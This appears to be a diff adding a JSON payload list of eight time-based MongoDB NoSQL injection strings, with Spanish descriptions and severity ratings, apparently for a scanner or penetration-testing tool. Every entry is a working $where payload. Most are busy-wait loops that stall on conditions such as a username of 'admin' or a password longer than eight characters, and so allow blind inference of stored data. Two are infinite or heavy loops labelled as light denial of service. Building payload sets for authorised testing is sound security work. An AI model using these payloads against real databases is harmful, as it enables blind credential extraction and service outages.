@@ -1,0 +1,58 @@
+[
+    {
+      "id": "mongo-time-001",
+      "description": "Sleep usando bucle bloqueante simple",
+      "severity": "medium",
+      "payload": "{\"$where\": \"function() { var start = new Date(); while(new Date() - start < 5000){}; return true; }\"}",
+      "category": "time-based"
+    },
+    {
+      "id": "mongo-time-002",
+      "description": "Delay condicional basado en comparación",
+      "severity": "medium",
+      "payload": "{\"$where\": \"function() { if(this.username === 'admin'){ var start = new Date(); while(new Date() - start < 5000){} } return true; }\"}",
+      "category": "time-based"
+    },
+    {
+      "id": "mongo-time-003",
+      "description": "Delay basado en longitud de campo",
+      "severity": "medium",
+      "payload": "{\"$where\": \"function() { if(this.password.length > 8){ var start = new Date(); while(new Date() - start < 5000){} } return true; }\"}",
+      "category": "time-based"
+    },
+    {
+      "id": "mongo-time-004",
+      "description": "Loop infinito controlado",
+      "severity": "high",
+      "payload": "{\"$where\": \"function() { while(true){} }\"}",
+      "category": "time-based"
+    },
+    {
+      "id": "mongo-time-005",
+      "description": "Delay usando Date.now()",
+      "severity": "medium",
+      "payload": "{\"$where\": \"function() { var t = Date.now(); while(Date.now() - t < 7000){}; return true; }\"}",
+      "category": "time-based"
+    },
+    {
+      "id": "mongo-time-006",
+      "description": "Delay condicional boolean-based + time-based híbrido",
+      "severity": "medium",
+      "payload": "{\"$where\": \"function() { if(this.age > 30){ var t = Date.now(); while(Date.now() - t < 6000){} } return true; }\"}",
+      "category": "time-based"
+    },
+    {
+      "id": "mongo-time-007",
+      "description": "Carga computacional pesada (DoS ligero)",
+      "severity": "high",
+      "payload": "{\"$where\": \"function() { for(var i=0;i<100000000;i++){} return true; }\"}",
+      "category": "time-based"
+    },
+    {
+      "id": "mongo-time-008",
+      "description": "Delay basado en existencia de campo",
+      "severity": "medium",
+      "payload": "{\"$where\": \"function() { if(this.email){ var t = Date.now(); while(Date.now() - t < 5000){} } return true; }\"}",
+      "category": "time-based"
+    }
+  ]
